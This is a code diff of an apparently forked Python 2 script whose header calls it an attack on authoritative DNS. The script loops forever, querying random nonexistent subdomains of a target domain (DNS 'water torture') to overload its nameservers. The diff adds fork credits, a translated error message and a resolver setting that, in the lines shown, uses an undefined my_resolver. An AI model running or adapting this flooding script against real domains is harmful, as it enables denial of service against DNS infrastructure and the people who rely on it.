@@ -4,11 +4,13 @@
 #Filename: subdominio.py
 #Purpose : Ataque DNS autoritativo con peticion de subdominios aleatorios inexistentes
 #From: https://github.com/hackingyseguridad/watertorture/blob/master/subdominio.py 
+#-- Forked by Christopher Gray
+# date: 4/19/18
 
 import dns.resolver
 import random
 import sys
-import socket  
+import socket
 
 if len(sys.argv) < 2 or len(sys.argv) > 3:
     print "Using: " , sys.argv[0] , " domain "
@@ -18,8 +20,14 @@ elif len(sys.argv) == 2:
     try:
         host=socket.gethostbyname(dominio)
     except:
-        print "Dominio no valido"
+        print "Domain not valid"
         exit(0)
+
+
+# 8.8.8.8 is Google's public DNS server
+#my_resolver.nameservers = ['8.8.8.8']
+
+my_resolver.nameservers = [sys.argv[1]]
 
 while 1:
 	subdominio = str(random.randrange(10000000))
@@ -28,6 +36,7 @@ while 1:
 	print "IP for Domain:", host
 	print "SubDomain:", url
 
+	#r = dns.resolver.query('example.org', 'a')
 	answers = dns.resolver.query(url)
 	for rdata in answers: 
 		print "IP SubDomain:", rdata
